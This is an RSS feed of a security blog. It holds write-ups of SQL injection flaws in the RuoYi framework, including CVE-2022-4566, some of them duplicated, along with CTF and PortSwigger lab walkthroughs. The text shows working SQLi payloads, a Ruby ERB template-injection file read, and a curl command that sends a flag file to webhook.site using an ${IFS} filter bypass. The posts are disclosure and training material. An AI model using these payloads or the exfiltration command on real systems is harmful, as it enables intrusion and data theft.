<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>All Posts - g03m0n</title>
        <link>https://g03m0n.github.io/posts/</link>
        <description>All Posts | g03m0n</description>
        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 27 Aug 2024 08:29:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/posts/" rel="self" type="application/rss+xml" /><item>
    <title>Blind SQL Injection at Rouyi framework ≤ v4.7.9</title>
    <link>https://g03m0n.github.io/posts/cve-2024-42900/</link>
    <pubDate>Tue, 27 Aug 2024 08:29:01 &#43;0800</pubDate>
    <author>g03m0n</author>
    <guid>https://g03m0n.github.io/posts/cve-2024-42900/</guid>
    <description><![CDATA[<h1 id="blind-sql-injection-at-rouyi-framework--v479">Blind SQL Injection at Rouyi framework ≤ v4.7.9</h1>
<h2 id="1-description-and-impact">1. <strong>Description and Impact</strong></h2>
<p>The Blind SQL Injection vulnerability occurs in the file <code>com/ruoyi/generator/controller/GenController</code> specifically at the endpoint <code>/tool/gen/createTable</code>. Manipulating this file allows an attacker to execute arbitrary SQL commands, which can endanger the security, integrity, and availability of the system.</p>
<p>SQL injection vulnerability in <code>/tool/gen/createTable</code> in Ruoyi Framework at version ≤ 4.7.9 allows attackers to execute arbitrary SQL commands via the <code>sql</code> parameter.</p>
<table>
<thead>
<tr>
<th><strong>Type</strong></th>
<th><strong>Required Authentication</strong></th>
<th><strong>Version Affected</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>SQL Injection</td>
<td>Yes</td>
<td>All versions</td>
</tr>
</tbody>
</table>
<h2 id="2-root-cause-analysis">2. <strong>Root Cause Analysis</strong></h2>
<p>After patching vulnerabilities <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-4566" target="_blank" rel="noopener noreffer">CVE-2022-4566</a>
 with commit <a href="https://gitee.com/y_project/RuoYi/commit/167970e5c4da7bb46217f576dc50622b83f32b40" target="_blank" rel="noopener noreffer">https://gitee.com/y_project/RuoYi/commit/167970e5c4da7bb46217f576dc50622b83f32b40</a>
, the SQLi vulnerability still exists at the endpoint <code>/tool/gen/createTable</code> as <strong>Blind SQLi.</strong></p>
<p>Read my CVE-2022-4566 analyze <a href="https://g03m0n.github.io/posts/cve-2022-4566/" target="_blank" rel="noopener noreffer">here</a>
</p>
<h2 id="3-steps-to-reproduce">3. <strong>Steps to reproduce</strong></h2>
<p><strong>Set up environment</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#a6e22e">git</span> <span style="color:#66d9ef">clone</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">://</span><span style="color:#a6e22e">gitee</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span><span style="color:#f92672">/</span><span style="color:#a6e22e">y_project</span><span style="color:#f92672">/</span><span style="color:#a6e22e">RuoYi</span><span style="color:#f92672">.</span><span style="color:#a6e22e">git</span>
</span></span></code></pre></div><p><a href="https://doc.ruoyi.vip/ruoyi/document/hjbs.html" target="_blank" rel="noopener noreffer">https://doc.ruoyi.vip/ruoyi/document/hjbs.html</a>
</p>
<p><strong>PoC</strong></p>
<p>Log in using the account<code>admin/admin123</code>and send a POST request to the endpoint <code>/tool/gen/createTable</code></p>
<p><strong>Payload</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sql<span style="color:#f92672">=</span>create table test <span style="color:#66d9ef">as</span> select<span style="color:#f92672">/**/*</span> <span style="color:#f92672">from</span> sys_job where <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> union select<span style="color:#f92672">/**/</span>sleep(<span style="color:#ae81ff">10</span>),<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">13</span>;
</span></span></code></pre></div><p></p>

   
       
       <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
         <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/4rmbBW8QHOk?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"
         ></iframe>
       </div>

]]></description>
</item>
<item>
    <title>Blind SQL Injection at Rouyi framework ≤ v4.7.9</title>
    <link>https://g03m0n.github.io/posts/blind-sqli-at-rouyi-v4.7.9/</link>
    <pubDate>Mon, 10 Jun 2024 08:29:01 &#43;0800</pubDate>
    <author>g03m0n</author>
    <guid>https://g03m0n.github.io/posts/blind-sqli-at-rouyi-v4.7.9/</guid>
    <description><![CDATA[<h1 id="blind-sql-injection-at-rouyi-framework--v479">Blind SQL Injection at Rouyi framework ≤ v4.7.9</h1>
<h2 id="1-description-and-impact">1. <strong>Description and Impact</strong></h2>
<p>The Blind SQL Injection vulnerability occurs in the file <code>com/ruoyi/generator/controller/GenController</code> specifically at the endpoint <code>/tool/gen/createTable</code>. Manipulating this file allows an attacker to execute arbitrary SQL commands, which can endanger the security, integrity, and availability of the system.</p>
<p>SQL injection vulnerability in <code>/tool/gen/createTable</code> in Ruoyi Framework at version ≤ 4.7.9 allows attackers to execute arbitrary SQL commands via the <code>sql</code> parameter.</p>
<table>
<thead>
<tr>
<th><strong>Type</strong></th>
<th><strong>Required Authentication</strong></th>
<th><strong>Version Affected</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>SQL Injection</td>
<td>Yes</td>
<td>All versions</td>
</tr>
</tbody>
</table>
<h2 id="2-root-cause-analysis">2. <strong>Root Cause Analysis</strong></h2>
<p>After patching vulnerabilities <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-4566" target="_blank" rel="noopener noreffer">CVE-2022-4566</a>
 with commit <a href="https://gitee.com/y_project/RuoYi/commit/167970e5c4da7bb46217f576dc50622b83f32b40" target="_blank" rel="noopener noreffer">https://gitee.com/y_project/RuoYi/commit/167970e5c4da7bb46217f576dc50622b83f32b40</a>
, the SQLi vulnerability still exists at the endpoint <code>/tool/gen/createTable</code> as <strong>Blind SQLi.</strong></p>
<p>Read my CVE-2022-4566 analyze <a href="https://g03m0n.github.io/posts/cve-2022-4566/" target="_blank" rel="noopener noreffer">here</a>
</p>
<h2 id="3-steps-to-reproduce">3. <strong>Steps to reproduce</strong></h2>
<p>Set up environment:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#a6e22e">git</span> <span style="color:#66d9ef">clone</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">://</span><span style="color:#a6e22e">gitee</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span><span style="color:#f92672">/</span><span style="color:#a6e22e">y_project</span><span style="color:#f92672">/</span><span style="color:#a6e22e">RuoYi</span><span style="color:#f92672">.</span><span style="color:#a6e22e">git</span>
</span></span></code></pre></div><p><a href="https://doc.ruoyi.vip/ruoyi/document/hjbs.html" target="_blank" rel="noopener noreffer">https://doc.ruoyi.vip/ruoyi/document/hjbs.html</a>
</p>
<p>PoC</p>
<p>Log in using the account<code>admin/admin123</code>and send a POST request to the endpoint <code>/tool/gen/createTable</code></p>
<p>Payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>sql<span style="color:#f92672">=</span>create table test <span style="color:#66d9ef">as</span> select<span style="color:#f92672">/**/*</span> <span style="color:#f92672">from</span> sys_job where <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> union select<span style="color:#f92672">/**/</span>sleep(<span style="color:#ae81ff">10</span>),<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">13</span>;
</span></span></code></pre></div><p></p>
<p><a href="https://youtu.be/4rmbBW8QHOk" target="_blank" rel="noopener noreffer">https://youtu.be/4rmbBW8QHOk</a>
</p>
]]></description>
</item>
<item>
    <title>Hackthebox - Neonify</title>
    <link>https://g03m0n.github.io/posts/hackthebox---neonify/</link>
    <pubDate>Mon, 10 Jun 2024 08:29:01 &#43;0800</pubDate>
    <author>g03m0n</author>
    <guid>https://g03m0n.github.io/posts/hackthebox---neonify/</guid>
    <description><![CDATA[<h2 id="description">Description</h2>
<p>Link challenge tại <a href="https://app.hackthebox.com/challenges/Neonify" target="_blank" rel="noopener noreffer">đây</a>
</p>
<h2 id="step">Step</h2>
<p>Đây là giao diện chính của challenge:</p>
<p></p>
<p>Đọc source code ta có thể thấy ứng dụng chạy bằng Ruby và sử dụng <a href="https://docs.ruby-lang.org/en/2.3.0/ERB.html" target="_blank" rel="noopener noreffer">ERB template</a>
 để render.
Đây có thể là một bài SSTI Ruby ERB Template.</p>
<p>Ngoài ra input còn bị regrex match với tất cả kí tự từ 0 tới 9, từ a tới z.</p>
<p></p>
<p>Ở đây regex sẽ chỉ match từ đầu tới cuối ở trong một dòng, tức là nếu chèn vào một string bất kì rồi dùng ký tự new line <code>(\n)</code> để xuống dòng, rồi chèn vào payload SSTI thì sẽ exploit thành công.</p>
<p>Đọc thêm tại đây: <a href="https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/" target="_blank" rel="noopener noreffer">https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/</a>
</p>
<p>Payload:</p>
<pre tabindex="0"><code>keke
&lt;%= File.open(&#39;flag.txt&#39;).read %&gt;
</code></pre><p>Endcode payload:</p>
<p></p>
<p>Chèn payload và gửi request:</p>
<p></p>
<p>Flag: <code>HTB{r3pl4c3m3n7_s3cur1ty}</code></p>
]]></description>
</item>
<item>
    <title>CVE-2022-4566</title>
    <link>https://g03m0n.github.io/posts/cve-2021-3129/</link>
    <pubDate>Wed, 01 May 2024 08:29:01 &#43;0800</pubDate>
    <author>g03m0n</author>
    <guid>https://g03m0n.github.io/posts/cve-2021-3129/</guid>
    <description><![CDATA[<h1 id="sql-injection-at-rouyi-framework-cve-2022-4566">SQL Injection at Rouyi framework (CVE-2022-4566)</h1>
<h2 id="1-description-and-impact">1. <strong>Description and Impact</strong></h2>
<p>CVE-2022-4566 is a critical vulnerability identified in the RuoYi Framework. This vulnerability occurs in the file com/ruoyi/generator/controller/GenController and is related to SQL injection attacks. Manipulating this file allows an attacker to execute arbitrary SQL commands, potentially compromising the security, integrity, and availability of the system.</p>
<pre><code>| **Type** | **Required Authentication** | **?-day** | **CVSS** | **Version Affected** |
| --- | --- | --- | --- | --- |
| SQL Injection | Yes | n-day | 9.8 (NIST) | ≤ 4.7.5 |
</code></pre>
<h2 id="2-root-cause-analysis">2. Root cause analysis</h2>
<pre><code>First, the application allows users to create tables by sending a POST packet containing SQL statements to the endpoint `/tool/gen/createTables`

![Untitled](https://github.com/user-attachments/assets/b34c589f-0f82-4353-b468-99a56d3dd005)

Success create table:

![Untitled-1](https://github.com/user-attachments/assets/ffa17fc1-fccf-4a3f-90dc-c8e9d555c27e)

The vulnerability occurs here when an attacker can inject arbitrary SQL commands into the user input.

**Debug:**

![Untitled-2](https://github.com/user-attachments/assets/4ed505ed-97c9-48b3-9585-f49a276945dd)

Initially, the `filterKeyword()` method receives the `sql` value of String type, which is the user's input.

Inside the `filterKeyword()` function, the application checks if there is input using the `isEmpty()` function. If there is, it moves to the next statement.

Here, the application uses the `StringUtils.split()` method to split the `SQL_REGEX` string into an array of SQL statements based on the pipe (`|`) delimiter, then assigns it to the `sqlKeywords` array.

![Untitled-10](https://github.com/user-attachments/assets/21a50d34-334d-460e-afeb-5555d4d43b17)

![Untitled-3](https://github.com/user-attachments/assets/5ec28d96-6815-483d-a03d-a26b82239be5)

Next, the application iterates through all elements of the `sqlKeywords` array, with `sqlKeyword` successively taking the value of each SQL statement in the `sqlKeywords` array.

![Untitled-4](https://github.com/user-attachments/assets/75490d0b-0c9d-40a3-825e-de3080cbf42a)

The application uses the `indexOfIgnoreCase()` method to find the first occurrence of the sqlKeyword array in the value string, case-insensitive. If `indexOfIgnoreCase()` returns a value `&gt; -1`, it means `sqlKeyword` has been found in value. This condition checks if the value string contains any SQL statement matching the blacklist.

If an SQL statement is found in value, this code snippet will throw an Exception: `UtilException.&quot;参数存在SQL注入风险&quot;` which means `Parameter has risk of SQL Injection attack`.

After validating the input, the application will continue to run.

![Untitled-5](https://github.com/user-attachments/assets/bf803a4f-c20f-4356-addd-59ee948de5b4)

Since the application allows multiple statements to be executed simultaneously, it uses the `SQLUtils.parseStatements()` method to split the input SQL string into a list of SQL statements and then assigns it to the `sqlStatements`

`List&lt;String&gt;tableNames = new ArrayList&lt;&gt;();` : Creates a list to store the names of created tables.

![Untitled-6](https://github.com/user-attachments/assets/4c0a8a69-f5d8-47df-b70d-413f54e67152)

Next, the application iterates through each SQL statement in `sqlStatements` with the element `sqlStatement`.

![Untitled-7](https://github.com/user-attachments/assets/27c1ca44-a6a8-4172-9589-dd915e274593)

Here, the application checks if the statement is `CREATE TABLE` by using `instanceof`. If true, it converts that statement to a `MySqlCreateTableStatement` object.

Next, the application will call the `genTableService.createTable` method to execute the SQL statement.

![Untitled-8](https://github.com/user-attachments/assets/c19807bb-62b1-493c-9f4b-222fdd228d24)

If successful, it retrieves the table name and adds it to the `tableNames` list.

If an error occurs, the application will jump to the catch block and output an error message along with `e.getMessage()` containing the result of the newly passed SQL statement.

→ This is the Sink of the vulnerability

![Untitled-9](https://github.com/user-attachments/assets/a6f1e2e3-fd19-4771-b9af-6bc6c1237a05)

→ This is an Error-Based SQL Injection vulnerability.
</code></pre>
<h2 id="3-steps-to-reproduce">3. Steps to reproduce</h2>
<pre><code>Send a POST request to the endpoint `/tool/gen/createTable` with the Payload:

```jsx
sql=CREATE table keke as SELECT/**/* FROM sys_job WHERE 1=1 
AND/**/extractvalue(1,concat(0x7e,(select/**/version()),0x7e));
```
</code></pre>
<h2 id="4-recomendation">4. Recomendation</h2>
<pre><code>In version 4.7.6, RuoYi added a commit with the code [167970e5c4da7bb46217f576dc50622b83f32b40](https://gitee.com/y_project/RuoYi/commit/167970e5c4da7bb46217f576dc50622b83f32b40) to add some statements to the blacklist and not directly return `e.getMessage()` to summarize error information to avoid SQL injection.
</code></pre>
<h2 id="references">References</h2>
<p><a href="https://gitee.com/y_project/RuoYi/issues/I65V2B" target="_blank" rel="noopener noreffer">https://gitee.com/y_project/RuoYi/issues/I65V2B</a>
</p>
<p><a href="https://www.cvedetails.com/cve/CVE-2022-4566/?q=cve-2022-4566" target="_blank" rel="noopener noreffer">CVE-2022-4566 Details</a>
</p>
<p><a href="https://www.cvedetails.com/cve/CVE-2022-48114/?q=cve-2022-48114" target="_blank" rel="noopener noreffer">https://www.cvedetails.com/cve/CVE-2022-48114/?q=cve-2022-48114</a>
</p>
]]></description>
</item>
<item>
    <title>CVE-2022-4566</title>
    <link>https://g03m0n.github.io/posts/cve-2022-4566/</link>
    <pubDate>Wed, 01 May 2024 08:29:01 &#43;0800</pubDate>
    <author>g03m0n</author>
    <guid>https://g03m0n.github.io/posts/cve-2022-4566/</guid>
    <description><![CDATA[<h1 id="sql-injection-at-rouyi-framework-cve-2022-4566">SQL Injection at Rouyi framework (CVE-2022-4566)</h1>
<h2 id="1-description-and-impact">1. <strong>Description and Impact</strong></h2>
<p>CVE-2022-4566 is a critical vulnerability identified in the RuoYi Framework. This vulnerability occurs in the file <code>com/ruoyi/generator/controller/GenController</code> and is related to SQL injection attacks. Manipulating this file allows an attacker to execute arbitrary SQL commands, potentially compromising the security, integrity, and availability of the system.</p>
<table>
<thead>
<tr>
<th><strong>Type</strong></th>
<th><strong>Required Authentication</strong></th>
<th><strong>?-day</strong></th>
<th><strong>CVSS</strong></th>
<th><strong>Version Affected</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>SQL Injection</td>
<td>Yes</td>
<td>n-day</td>
<td>9.8 (NIST)</td>
<td>≤ 4.7.5</td>
</tr>
</tbody>
</table>
<h2 id="2-root-cause-analysis">2. Root cause analysis</h2>
<p>First, the application allows users to create tables by sending a POST packet containing SQL statements to the endpoint <code>/tool/gen/createTables</code></p>
<p></p>
<p>Success create table:</p>
<p></p>
<p>The vulnerability occurs here when an attacker can inject arbitrary SQL commands into the user input.</p>
<p><strong>Debug:</strong></p>
<p></p>
<p>Initially, the <code>filterKeyword()</code> method receives the <code>sql</code> value of String type, which is the user&rsquo;s input.</p>
<p>Inside the <code>filterKeyword()</code> function, the application checks if there is input using the <code>isEmpty()</code> function. If there is, it moves to the next statement.</p>
<p>Here, the application uses the <code>StringUtils.split()</code> method to split the <code>SQL_REGEX</code> string into an array of SQL statements based on the pipe (<code>|</code>) delimiter, then assigns it to the <code>sqlKeywords</code> array.</p>
<p></p>
<p></p>
<p>Next, the application iterates through all elements of the <code>sqlKeywords</code> array, with <code>sqlKeyword</code> successively taking the value of each SQL statement in the <code>sqlKeywords</code> array.</p>
<p></p>
<p>The application uses the <code>indexOfIgnoreCase()</code> method to find the first occurrence of the sqlKeyword array in the value string, case-insensitive. If <code>indexOfIgnoreCase()</code> returns a value <code>&gt; -1</code>, it means <code>sqlKeyword</code> has been found in value. This condition checks if the value string contains any SQL statement matching the blacklist.</p>
<p>If an SQL statement is found in value, this code snippet will throw an Exception: <code>UtilException.&quot;参数存在SQL注入风险&quot;</code> which means <code>Parameter has risk of SQL Injection attack</code>.</p>
<p>After validating the input, the application will continue to run.</p>
<p></p>
<p>Since the application allows multiple statements to be executed simultaneously, it uses the <code>SQLUtils.parseStatements()</code> method to split the input SQL string into a list of SQL statements and then assigns it to the <code>sqlStatements</code></p>
<p><code>List&lt;String&gt;tableNames = new ArrayList&lt;&gt;();</code> : Creates a list to store the names of created tables.</p>
<p></p>
<p>Next, the application iterates through each SQL statement in <code>sqlStatements</code> with the element <code>sqlStatement</code>.</p>
<p></p>
<p>Here, the application checks if the statement is <code>CREATE TABLE</code> by using <code>instanceof</code>. If true, it converts that statement to a <code>MySqlCreateTableStatement</code> object.</p>
<p>Next, the application will call the <code>genTableService.createTable</code> method to execute the SQL statement.</p>
<p></p>
<p>If successful, it retrieves the table name and adds it to the <code>tableNames</code> list.</p>
<p>If an error occurs, the application will jump to the catch block and output an error message along with <code>e.getMessage()</code> containing the result of the newly passed SQL statement.</p>
<p>→ This is the Sink of the vulnerability</p>
<p></p>
<p>→ This is an Error-Based SQL Injection vulnerability.</p>
<h2 id="3-steps-to-reproduce">3. Steps to reproduce</h2>
<p>Send a POST request to the endpoint <code>/tool/gen/createTable</code> with the Payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">sql</span><span style="color:#f92672">=</span><span style="color:#a6e22e">CREATE</span> <span style="color:#a6e22e">table</span> <span style="color:#a6e22e">keke</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">SELECT</span><span style="color:#75715e">/**/</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">sys_job</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">AND</span><span style="color:#75715e">/**/</span><span style="color:#a6e22e">extractvalue</span>(<span style="color:#ae81ff">1</span>,<span style="color:#a6e22e">concat</span>(<span style="color:#ae81ff">0x7e</span>,(<span style="color:#a6e22e">select</span><span style="color:#75715e">/**/</span><span style="color:#a6e22e">version</span>()),<span style="color:#ae81ff">0x7e</span>));
</span></span></code></pre></div><h2 id="4-recomendation">4. Recomendation</h2>
<p>In version 4.7.6, RuoYi added a commit with the code <a href="https://gitee.com/y_project/RuoYi/commit/167970e5c4da7bb46217f576dc50622b83f32b40" target="_blank" rel="noopener noreffer">167970e5c4da7bb46217f576dc50622b83f32b40</a>
 to add some statements to the blacklist and not directly return <code>e.getMessage()</code> to summarize error information to avoid SQL injection.</p>
<h2 id="references">References</h2>
<p><a href="https://gitee.com/y_project/RuoYi/issues/I65V2B" target="_blank" rel="noopener noreffer">https://gitee.com/y_project/RuoYi/issues/I65V2B</a>
</p>
<p><a href="https://www.cvedetails.com/cve/CVE-2022-4566/?q=cve-2022-4566" target="_blank" rel="noopener noreffer">CVE-2022-4566 Details</a>
</p>
<p><a href="https://www.cvedetails.com/cve/CVE-2022-48114/?q=cve-2022-48114" target="_blank" rel="noopener noreffer">https://www.cvedetails.com/cve/CVE-2022-48114/?q=cve-2022-48114</a>
</p>
]]></description>
</item>
<item>
    <title>CookieCTF - The Existed File</title>
    <link>https://g03m0n.github.io/posts/cookiectf--the-existed-file/</link>
    <pubDate>Sat, 20 Jan 2024 08:29:01 &#43;0800</pubDate>
    <author>g03m0n</author>
    <guid>https://g03m0n.github.io/posts/cookiectf--the-existed-file/</guid>
    <description><![CDATA[<h2 id="description">Description</h2>
<p>Link challenge tại <a href="https://battle.cookiearena.org/arenas/mini-ctf-web-hacking/battle/the-existed-file" target="_blank" rel="noopener noreffer">đây</a>
</p>
<h2 id="step">Step</h2>
<p>Đây là giao diện chính của challenge.</p>
<p></p>
<p>Thử nhập <code>/flag.txt</code> vẫn không có thay đổi gì. Ta thử nhập <code>cat /flag.txt</code> xem có xem được <code>flag</code> không nhưng lại hiện ra thông báo <code>Blacklist characters detected!</code>.</p>
<p></p>
<p>Kiểm tra <code>soucre code</code> có thể thấy luồng hoạt động của server.</p>
<p></p>
<p>Đoạn code này loại bỏ khoảng trắng của <code>input</code> người dùng nhập vào. Nó sử dụng phương thức <code>translate()</code> của lớp <code>string</code> để thay thế tất cả các ký tự khoảng trắng bằng giá trị <code>None</code>.
Sau đó sẽ sử dung hàm <code>is_blacklisted</code> để kiểm tra <code>input</code> có nằm trong blacklist hay không.</p>
<p>Có thể thấy <code>blacklist</code> đã loại bỏ hầu hết các câu lệnh giúp ta đọc được file <code>flag</code>, tuy nhiên anh dev có lẽ đã quên mất <code>filter</code> 1 cái nữa đó là <code>$(command)</code>. Câu lệnh này tương đương với sử dụng dấu <code>backstick</code>.</p>
<p></p>
<p>Quay lại challenge thử chạy luôn nhưng nó vẫn không xuất được nội dung</p>
<p></p>
<p>Tới đây ta để ý <code>blacklist</code> không lọc lệnh <code>curl</code> nên ta có thể gửi file <code>flag</code> qua host khác để đọc bằng option <code>-F</code>.
Ở đây mình sử dụng <code>webhook.site</code> để làm host nhận file.</p>
<p>Payload: <code>curl -F @/flag.txt https://webhook.site/407cb1c3-4316-4cb8-8b9c-4ece7abf8d11</code></p>
<p>Nhưng vẫn còn hàm <code>translate()</code> loại bỏ khoảng trắng của <code>input</code>. Search gg một lúc thì mình tìm được cái này:</p>
<p></p>
<p>Có thể sử dụng <code>${IFS}</code> để thay thế các ký tự <code>&lt;space&gt;</code> <code>&lt;tab&gt;</code> <code>&lt;newline&gt;</code>.</p>
<p>Payload: <code>$(curl${IFS}-F${IFS}file=@/flag.txt${IFS}https://webhook.site/407cb1c3-4316-4cb8-8b9c-4ece7abf8d11)</code></p>
<p></p>
<p>Tải file <code>flag.txt</code>về ta được flag:
<code>CHH{os_c0mManD_INj3cTi0N_bypa5S_FIL7Er_b1f4b3371b6a365f47334d3ec07a8d0e}</code></p>
]]></description>
</item>
<item>
    <title>PortSwigger - SQL Injection</title>
    <link>https://g03m0n.github.io/posts/portswigger-sqli/</link>
    <pubDate>Sat, 20 Jan 2024 08:29:01 &#43;0800</pubDate>
    <author>g03m0n</author>
    <guid>https://g03m0n.github.io/posts/portswigger-sqli/</guid>
    <description><![CDATA[<h2 id="1-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h2>
<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data" target="_blank" rel="noopener noreffer">đây</a>
</p>
<p>Level: APPRENTICE</p>
<h3 id="description">Description</h3>
<p>Lab này chứa lỗ hổng SQLi trong bộ lọc danh mục sản phẩm. Khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Gifts&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>Để giải quyết bài lab, khiến ứng dụng hiển thị một hoặc nhiều sản phẩm chưa được phát hành.</p>
<h3 id="step">Step</h3>
<p>Đầu tiên click vào một category bất kỳ
Sau khi nhấp vào <code>Accessories</code> category, URL hiển thị:</p>
<pre tabindex="0"><code>https://0a8000e303dd05e481ca2ff0002600bb.web-security-academy.net/filter?category=Accessories
</code></pre><p>Để ý những từ in đậm là chuỗi truy vấn.
Ứng dụng sẽ thực hiện một truy vấn SQL để lấy thông tin từ cơ sở dữ liệu.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>Mục tiêu là lấy tất cả thông tin sản phẩm, từ tất cả danh mục và cả sản phẩm đã phát hành và chưa phát hành.
Câu lệnh trên hiển thị <code>released = 1</code> nghĩa là nó sẽ chỉ hiển thị các sản phẩm đã được phát hành, trong đó <code>released = 0</code> đại diện cho các sản phẩm chưa được phát hành.</p>
<p></p>
<p>Tiếp theo nếu thêm một dấu <code>'</code> vào cuối chuỗi truy vấn</p>
<p><code>?category=Accessories'</code></p>
<p>Câu truy vấn sẽ là</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>Điều này sẽ gây ra lỗi vì có một dấu <code>'</code> chưa được đóng.</p>
<p></p>
<p>Tiếp theo, thêm 2 dấu gạch ngang:</p>
<p><code>?category=Accessories' --</code></p>
<p>Câu truy vấn sẽ là</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>Trong MySQL, mọi thứ sau dấu <code>--</code> sẽ được coi là <code>comment</code>.
Có nghĩa là bây giờ trang web sẽ hiển thị tất cả các sản phẩm thuộc danh mục <code>Accessories</code>, cả <code>released</code> và <code>unreleased</code>.</p>
<p></p>
